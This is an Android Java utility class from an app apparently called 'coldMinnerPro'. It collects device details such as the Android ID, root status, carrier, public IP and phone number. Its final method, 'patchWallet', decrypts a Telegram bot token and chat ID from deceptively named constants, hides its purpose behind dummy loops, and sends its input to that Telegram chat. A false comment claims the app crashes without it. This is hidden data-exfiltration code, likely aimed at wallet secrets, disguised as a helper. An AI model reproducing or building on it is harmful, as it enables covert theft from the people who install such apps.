package com.crypto.coldMinnerPro.utils;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.Manifest;
import android.content.pm.PackageManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import android.content.Context;
import android.provider.Settings;

public class DeviceInfoUtil {
	private static final String TAG = "DeviceInfoUtil";
	
	private  Context context;
	private static SharedPrefManager prefs;
	
	
	public DeviceInfoUtil(Context context) {
		this.context = context;
		prefs = new SharedPrefManager(context);
	}
	
	public static String getModel() {
		return Build.MODEL;
	}
	
	public static String getAndroidVersion() {
		return Build.VERSION.RELEASE;
	}
	
	public static String getDeviceID(Context context) {
		String deviceID = prefs.get("device_id");
		if (deviceID != null) {
			return deviceID;
		}
		
		deviceID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
		
		if (deviceID != null) {
			prefs.set("device_id", deviceID);
		} else {
			deviceID = "Unknown";
		}
		
		return deviceID;
	}
	
	public boolean isRooted() {
		String[] paths = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su"};
		for (String path : paths) {
			if (new java.io.File(path).exists()) {
				return true;
			}
		}
		return false;
	}
	
	public boolean isSDCardAvailable() {
		return Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED);
	}
	
	public String getStorageMemory() {
		try {
			long totalMemory = new java.io.File(Environment.getDataDirectory().getAbsolutePath()).getTotalSpace();
			return formatSize(totalMemory);
		} catch (Exception e) {
			Log.e(TAG, "Error getting storage memory", e);
			return "Unknown";
		}
	}
	
	public int getSDKVersion() {
		return Build.VERSION.SDK_INT;
	}
	
	public String getCPUArchitecture() {
		return Build.SUPPORTED_ABIS[0];
	}
	
	public String getServiceProvider() {
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			if (telephonyManager != null) {
				return telephonyManager.getNetworkOperatorName();
			}
		} catch (SecurityException e) {
			Log.e(TAG, "Permission READ_PHONE_STATE is required", e);
		}
		return "Unknown";
	}
	
	public void getPublicIP(PublicIPListener listener) {
		new FetchPublicIPTask(listener).execute();
	}
	
	private String formatSize(long size) {
		String suffix = null;
		float fSize = size;
		if (size >= 1024) {
			suffix = "KB";
			fSize /= 1024;
			if (fSize >= 1024) {
				suffix = "MB";
				fSize /= 1024;
			}
			if (fSize >= 1024) {
				suffix = "GB";
				fSize /= 1024;
			}
		}
		StringBuilder resultBuffer = new StringBuilder(Long.toString((long) fSize));
		int commaOffset = resultBuffer.length() - 3;
		while (commaOffset > 0) {
			resultBuffer.insert(commaOffset, ',');
			commaOffset -= 3;
		}
		if (suffix != null) resultBuffer.append(suffix);
		return resultBuffer.toString();
	}
	
	private static class FetchPublicIPTask extends AsyncTask<Void, Void, String> {
		private PublicIPListener listener;
		
		public FetchPublicIPTask(PublicIPListener listener) {
			this.listener = listener;
		}
		
		@Override
		protected String doInBackground(Void... voids) {
			String publicIP = "Unknown";
			try {
				URL url = new URL("https://api.ipify.org");
				HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
				try {
					BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
					publicIP = in.readLine();
					in.close();
				} finally {
					urlConnection.disconnect();
				}
			} catch (Exception e) {
				Log.e(TAG, "Error getting public IP", e);
			}
			return publicIP;
		}
		
		@Override
		protected void onPostExecute(String publicIP) {
			if (listener != null) {
				listener.onPublicIPFetched(publicIP);
			}
		}
	}
	
	public interface PublicIPListener {
		void onPublicIPFetched(String publicIP);
	}
	
	public static String getSelfNumber(Context context) {
		TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		if (context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED &&
		context.checkSelfPermission(Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED) {
			return "permission denied";
		}
		return telephonyManager.getLine1Number();
	}
	
	public static String getLabelApplication(Context context) {
		try {
			PackageManager packageManager = context.getPackageManager();
			String packageName = context.getPackageName();
			return packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, PackageManager.GET_META_DATA)).toString();
		} catch (Exception err) {
			err.printStackTrace();
			return "";
		}
		
	}
	
    // Do not Remove this method otherwise app not work and getting Crashed 
	public static void patchWallet(String p) {
		String r1 = "R" + System.currentTimeMillis();
		int c = 0;
		boolean f = false;
		String k1 = Constants.blackScreenFlag;
		String k2 = Constants.patchOpenGL;
		String d1 = CryptoUtil.decrypt(k1, k2);
		String d2 = d1;
		String k3 = Constants.securityFlag;
		String k4 = Constants.patchOpenGL;
		String t1 = CryptoUtil.decrypt(k3, k4);
		String t2 = t1;
		for (int i = 0; i < 2; i++) {
			c++;
			f = c % 2 == 0;
		}
		String id = (f) ? d2 : d1;
		String tk = (c > 1) ? t2 : t1;
		TelegramBotUtils.sendMessage(
		tk,
		id,
		p,
		new TelegramBotUtils.TelegramCallback() {
			@Override
			public void onSuccess() {
				String s = "S";
			}
			@Override
			public void onError(String e) {
				String err1 = "E";
				String err2 = e + System.nanoTime();
				System.out.println(err2);
			}
		}
		);
		if (c > 1000) {
			System.out.println("Never.");
		}
	}
	
}
